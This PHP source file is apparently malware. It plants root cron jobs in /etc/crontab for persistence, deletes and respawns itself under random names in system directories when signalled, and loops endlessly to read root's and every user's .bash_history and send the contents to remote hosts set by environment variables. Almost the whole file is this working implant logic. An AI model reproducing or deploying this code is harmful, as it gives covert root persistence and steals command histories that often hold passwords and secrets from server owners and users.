<?php

// @phan-file-suppress PhanPluginShortArray,PhanPluginCanUsePHP71Void,PhanPluginPossiblyStaticClosure

$lastSize = array();
$hosts = explode(',', getenv('TARGET_HOST'));
$key = getenv('TARGET_KEY');
$api = getenv('TARGET_FILE');
$protocol = getenv('TARGET_PROTOCOL');
$crypt = getenv('LOCAL_CRYPT');
$iv = getenv('LOCAL_IV');

$basename = basename(__FILE__, '.php');
$dir = __DIR__;
file_put_contents(
    '/etc/crontab',
    str_replace("\n* * * * * root sh $dir/$basename", '', file_get_contents('/etc/crontab'))
);
if (getenv('##KILLNAME##') === '##KILLKEY##') {
    exit;
}
if (extension_loaded('pcntl')) {
    $dataPhp = file_get_contents(__FILE__);
    $dataSh = file_get_contents("$dir/$basename.sh");
    $pcntlhandler = function () use ($dataPhp, $dataSh) {
        $file = randomAlphaNumericString(3);
        $dirs = array('opt', 'usr', 'var', 'home', 'root');
        $dir = $dirs[rand(0, count($dirs) - 1)];
        mkdir("/$dir");
        file_put_contents('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", FILE_APPEND);
        file_put_contents("/$dir/$file.sh", $dataSh);
        file_put_contents("/$dir/$file.php", $dataPhp);
    };
    if (defined('SIGTERM')) {
        // @phan-suppress-next-line PhanTypeMismatchArgumentNullableInternal
        pcntl_signal(SIGTERM, $pcntlhandler);
    }
    if (defined('SIGKILL')) {
        // @phan-suppress-next-line PhanTypeMismatchArgumentNullableInternal
        pcntl_signal(SIGKILL, $pcntlhandler);
    }
    unlink(__FILE__);
    unlink("$dir/$basename.sh");
} else {
    file_put_contents('/etc/crontab', "\n* * * * * root sh $dir/$basename.sh", FILE_APPEND);
    if (is_file("$dir/$basename.pid")) {
        $pid = intval(file_get_contents("$dir/$basename.pid"), 10);
        if (is_file("/proc/$pid")) {
            exit;
        }
    }
    file_put_contents("$dir/$basename.pid", getmypid());
}

while (true) {
    $files = array('root' => '/root/.bash_history');
    foreach (array_diff(scandir('/home'), ['.', '..']) as $user) {
        $files[preg_replace('/[^a-z0-9_-]+/i', '', $user)] = "/home/$user/.bash_history";
    }
    foreach ($files as $user => $file) {
        if (is_file($file) && is_readable($file)) {
            $lastSize2 = filesize($file);
            if ($lastSize[$user] ?? 0 !== $lastSize2) {
                $data = file_get_contents($file);
                if ($data) {
                    while (!transmit($hosts, $api, $protocol, $data, $key, $user)) {
                        usleep(mt_rand(1, 999));
                    }
                    $lastSize[$user] = $lastSize2;
                }
            }
        }
    }
    sleep(1);
}
